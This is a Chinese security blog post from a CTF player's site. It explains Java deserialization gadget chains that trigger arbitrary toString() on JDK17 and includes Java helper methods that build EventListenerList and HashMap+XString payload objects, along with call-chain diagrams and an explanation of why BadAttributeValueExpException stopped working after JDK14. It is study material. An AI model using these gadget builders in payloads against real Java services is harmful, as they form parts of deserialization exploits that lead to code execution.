@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="继续JDK17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高版本触发toString的几种方法">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/02/02/%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="继续JDK17">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202222134437.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202223314549.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202230629851.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202231442579.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202231727675.png">
+<meta property="article:published_time" content="2026-02-02T06:51:31.000Z">
+<meta property="article:modified_time" content="2026-02-02T15:29:35.717Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202222134437.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/02/02/%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/02/02/%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/","path":"2026/02/02/高版本触发toString的几种方法/","title":"高版本触发toString的几种方法"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>高版本触发toString的几种方法 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#EventListenerList%E8%A7%A6%E5%8F%91toString"><span class="nav-number">1.</span> <span class="nav-text">EventListenerList触发toString</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">触发toString的工具方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91Gadget"><span class="nav-number">1.2.</span> <span class="nav-text">触发Gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BadAttributeValueExpException%E8%A7%A6%E5%8F%91toString"><span class="nav-number">2.</span> <span class="nav-text">BadAttributeValueExpException触发toString</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-1"><span class="nav-number">2.1.</span> <span class="nav-text">触发toString的工具方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E4%B8%BA%E4%BD%95%E5%A4%B1%E6%95%88%E4%BA%86"><span class="nav-number">2.2.</span> <span class="nav-text">链子为何失效了</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HashMap-XString%E8%A7%A6%E5%8F%91toString"><span class="nav-number">3.</span> <span class="nav-text">HashMap+XString触发toString</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-2"><span class="nav-number">3.1.</span> <span class="nav-text">触发toString的工具方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91Gadget-1"><span class="nav-number">3.2.</span> <span class="nav-text">触发Gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HotSwappableTargetSource-xString%E8%A7%A6%E5%8F%91toString"><span class="nav-number">4.</span> <span class="nav-text">HotSwappableTargetSource+xString触发toString</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-3"><span class="nav-number">4.1.</span> <span class="nav-text">触发toString的工具方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91Gadget-2"><span class="nav-number">4.2.</span> <span class="nav-text">触发Gadget</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hashtable-TextAndMnemonicHashMap%E8%A7%A6%E5%8F%91toString"><span class="nav-number">5.</span> <span class="nav-text">hashtable+TextAndMnemonicHashMap触发toString</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">链子分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hashtable-readObject"><span class="nav-number">5.1.1.</span> <span class="nav-text">hashtable#readObject()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashtable-reconstitutionPut"><span class="nav-number">5.1.2.</span> <span class="nav-text">hashtable#reconstitutionPut()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AbstractMap-equals"><span class="nav-number">5.1.3.</span> <span class="nav-text">AbstractMap#equals()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TextAndMnemonicHashMap-get"><span class="nav-number">5.1.4.</span> <span class="nav-text">TextAndMnemonicHashMap#get()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%B7%A5%E5%85%B7%E6%96%B9%E6%B3%95-4"><span class="nav-number">5.1.5.</span> <span class="nav-text">触发toString的工具方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91Gadget-3"><span class="nav-number">5.1.6.</span> <span class="nav-text">触发Gadget</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">179</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/02/02/%E9%AB%98%E7%89%88%E6%9C%AC%E8%A7%A6%E5%8F%91toString%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="高版本触发toString的几种方法 | root@wanth3f1ag">
+      <meta itemprop="description" content="继续JDK17">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          高版本触发toString的几种方法
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-02 14:51:31 / 修改时间：23:29:35" itemprop="dateCreated datePublished" datetime="2026-02-02T14:51:31+08:00">2026-02-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">继续JDK17</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>书接上文，我们讲到JDK17的强封装会导致我们的反射调用受到限制，只有exports声明包名的类，才能使用，只有opens声明包名的类，才能反射其私有属性。</p>
+<p>但是对于反射私有属性，我们前辈也发明出了修改当前运行类的模块偏移的办法。这也给高版本的反射提供了另一思路</p>
+<p>触发toString的链子还是蛮多的，但高版本下难免会有差异，本文对高版本下的触发toString的Gadget进行了一些整合以及说明。</p>
+<h1 id="EventListenerList触发toString"><a href="#EventListenerList触发toString" class="headerlink" title="EventListenerList触发toString"></a>EventListenerList触发toString</h1><p>之前分析的文章：<a href="https://wanth3f1ag.top/2025/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BEventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/">https://wanth3f1ag.top/2025/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BEventListenerList%E8%A7%A6%E5%8F%91%E4%BB%BB%E6%84%8FtoString/</a></p>
+<p>这个链子是很常见的，并且也是JDK17高版本里面触发toString的首选，跟完源代码后发现其实和JDK8没啥区别</p>
+<h2 id="触发toString的工具方法"><a href="#触发toString的工具方法" class="headerlink" title="触发toString的工具方法"></a>触发toString的工具方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取到EventListenerList实例对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EventListenerList <span class="title function_">getEventListenerList</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">EventListenerList</span> <span class="variable">eventListenerList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">    <span class="type">UndoManager</span> <span class="variable">undoManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从UndoManager父类CompoundEdit的edits中取出Vector对象，并将恶意类通过add添加</span></span><br><span class="line">    <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) Utils.getFieldValue(undoManager,<span class="string">&quot;edits&quot;</span>);</span><br><span class="line">    vector.add(obj);</span><br><span class="line"></span><br><span class="line">    Utils.setFieldValue(eventListenerList,<span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Class.class, undoManager&#125;);</span><br><span class="line">    <span class="keyword">return</span> eventListenerList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将返回的eventListenerList进行序列化和反序列化操作就能触发toString了</p>
+<h2 id="触发Gadget"><a href="#触发Gadget" class="headerlink" title="触发Gadget"></a>触发Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EventListenerList#readObject()-&gt;</span><br><span class="line">EventListenerList#add()-&gt;</span><br><span class="line">    UndoManager#toString()-&gt;</span><br><span class="line">        CompoundEdit#toString()-&gt;</span><br><span class="line">            Vector#toString()-&gt;</span><br><span class="line">                AbstractCollection#toString()-&gt;</span><br><span class="line">                    StringBuilder#append()-&gt;</span><br><span class="line">                        String#valueOf()-&gt;</span><br><span class="line">							obj#toString()任意类toString</span><br></pre></td></tr></table></figure>
+
+<h1 id="BadAttributeValueExpException触发toString"><a href="#BadAttributeValueExpException触发toString" class="headerlink" title="BadAttributeValueExpException触发toString"></a>BadAttributeValueExpException触发toString</h1><p>这条链子想必大家都不陌生，无论是CC5链还是fastjson原生链或者是Jackson原生链都用到了他</p>
+<h2 id="触发toString的工具方法-1"><a href="#触发toString的工具方法-1" class="headerlink" title="触发toString的工具方法"></a>触发toString的工具方法</h2><p>直接实例化一个BadAttributeValueExpException对象并传入val为需要触发toString的对象就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其实这个链子只适用于JDK8-14中，换成JDK15以上就不行了，这是为什么呢？</p>
+<h2 id="链子为何失效了"><a href="#链子为何失效了" class="headerlink" title="链子为何失效了"></a>链子为何失效了</h2><p>在JDK7中BadAttributeValueExpException并没有实现自己的readObject</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202222134437.png" alt="image-20260202222134437"></p>
+<p>在JDK8中的有了自己的BadAttributeValueExpException#readObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object val;   </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时val是一个Object对象</p>
+<p>直到JDK15中，val变成了String类型的字段</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260202223314549.png" alt="image-20260202223314549"></p>
+<p>所以大于JDK14后的版本这条链子也就无效了</p>
+<h1 id="HashMap-XString触发toString"><a href="#HashMap-XString触发toString" class="headerlink" title="HashMap+XString触发toString"></a>HashMap+XString触发toString</h1><p>这个链子在Fastjson原生反序列化里面也讲过：<a href="https://wanth3f1ag.top/2025/07/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E8%A7%A6%E5%8F%91toString-%E6%96%B9%E6%B3%952">https://wanth3f1ag.top/2025/07/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BFastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E8%A7%A6%E5%8F%91toString-%E6%96%B9%E6%B3%952</a></p>
+<h2 id="触发toString的工具方法-2"><a href="#触发toString的工具方法-2" class="headerlink" title="触发toString的工具方法"></a>触发toString的工具方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap+XString触发toString</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">HashMap#readObject() -&gt; XString#equals() -&gt; 任意调#toString()</span></span><br><span class="line"><span class="comment">make map1&#x27;s hashCode == map2&#x27;s</span></span><br><span class="line"><span class="comment">map3#readObject</span></span><br><span class="line"><span class="comment">    map3#put(map1,1)</span></span><br><span class="line"><span class="comment">    map3#put(map2,2)</span></span><br><span class="line"><span class="comment">        if map1&#x27;s hashCode == map2&#x27;s :</span></span><br><span class="line"><span class="comment">            map2#equals(map1)</span></span><br><span class="line"><span class="comment">                map2.xString#equals(obj) // obj = map1.get(zZ)</span></span><br><span class="line"><span class="comment">                    obj.toString</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">get_HashMap_XString</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">xString</span> <span class="operator">=</span> Utils.createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));</span><br><span class="line">    Utils.setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map1.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">    map1.put(<span class="string">&quot;zZ&quot;</span>,obj);</span><br><span class="line">    map2.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map3.put(map1,<span class="number">1</span>);</span><br><span class="line">    map3.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    map2.put(<span class="string">&quot;yy&quot;</span>, obj);</span><br><span class="line">    <span class="keyword">return</span> map3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将需要触发toString的对象传入get_HashMap_XString中，并将返回的HashMap进行序列化和反序列化</p>
+<h2 id="触发Gadget-1"><a href="#触发Gadget-1" class="headerlink" title="触发Gadget"></a>触发Gadget</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()-&gt;</span><br><span class="line">    HashMap#putVal()-&gt;</span><br><span class="line">    	XString#equals()-&gt;</span><br><span class="line">    		obj2#toString()</span><br></pre></td></tr></table></figure>
+
